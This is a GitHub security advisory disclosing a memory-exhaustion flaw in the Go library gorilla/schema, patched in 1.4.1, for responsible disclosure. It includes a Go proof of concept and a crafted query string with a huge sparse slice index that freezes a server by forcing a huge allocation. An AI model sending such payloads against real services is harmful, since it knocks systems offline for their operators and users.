# Potential memory exhaustion attack due to sparse slice deserialization

High

[jaitaiwan](/jaitaiwan)
published
GHSA-3669-72x9-r9p3
Jun 29, 2024

## Package

gomod

github.com/gorilla/schema
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

all

## Patched versions

1.4.1

## Description

### Details

Running `schema.Decoder.Decode()` on a struct that has a field of type `[]struct{...}` opens it up to malicious attacks regarding memory allocations, taking advantage of the sparse slice functionality. For instance, in the Proof of Concept written below, someone can specify to set a field of the billionth element and it will allocate all other elements before it in the slice.

In the local environment environment for my project, I was able to call an endpoint like `/innocent_endpoint?arr.10000000.X=1` and freeze my system from the memory allocation while parsing `r.Form`. I think [this line](https://github.com/gorilla/schema/blob/main/decoder.go#L223) is responsible for allocating the slice, although I haven't tested to make sure, so it's just an educated guess.

### Proof of Concept

The following proof of concept works on both v1.2.0 and v1.2.1. I have not tested earlier versions.

```
package main

import (
	"fmt"

	"github.com/gorilla/schema"
)

func main() {
	dec := schema.NewDecoder()
	var result struct {
		Arr []struct{ Val int }
	}
	if err := dec.Decode(&result, map[string][]string{"arr.1000000000.Val": {"1"}}); err != nil {
		panic(err)
	}
	fmt.Printf("%#+v\n", result)
}
```
### Impact

Any use of `schema.Decoder.Decode()` on a struct with arrays of other structs could be vulnerable to this memory exhaustion vulnerability. There seems to be no possible solution that a developer using this library can do to disable this behaviour without fixing it in this project, so all uses of Decode that fall under this umbrella are affected. A fix that doesn't require a major change may also be harder to find, since it could break compatibility with some other intended use-cases.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
